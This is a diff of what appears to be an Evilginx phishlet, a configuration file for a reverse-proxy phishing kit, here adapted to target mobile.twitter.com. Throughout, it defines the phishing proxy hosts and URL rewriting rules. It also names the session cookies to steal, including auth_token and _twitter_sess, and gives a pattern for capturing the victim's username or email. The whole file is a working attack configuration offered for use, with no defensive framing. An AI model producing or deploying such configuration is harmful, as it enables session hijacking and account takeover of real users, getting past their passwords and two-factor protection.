@@ -1,17 +1,17 @@
-name: 'twitter'
+name: 'twitter-mobile'
 author: '@white_fi'
-min_ver: '2.1.0'
+min_ver: '2.0.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
-  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
+  - {phish_sub: 'mobile', orig_sub: 'mobile', domain: 'twitter.com', session: true, is_landing: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: true, is_landing: false}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false}
 sub_filters:
-  - {hostname: 'twitter.com', sub: '', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'mobile.twitter.com', sub: 'mobile', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {hostname: 'abs.twimg.com', sub: 'abs', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {hostname: 'api.twitter.com', sub: 'api', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
-  - domain: '.twitter.com'
-    keys: ['kdt','_twitter_sess','twid','auth_token']
+  - domain: 'twitter.com'
+    keys: ['dnt','fm','kdt','_twitter_sess','twid','auth_token']
 user_regex:
   key: 'session[username_or_email]'
   re: '(.*)'
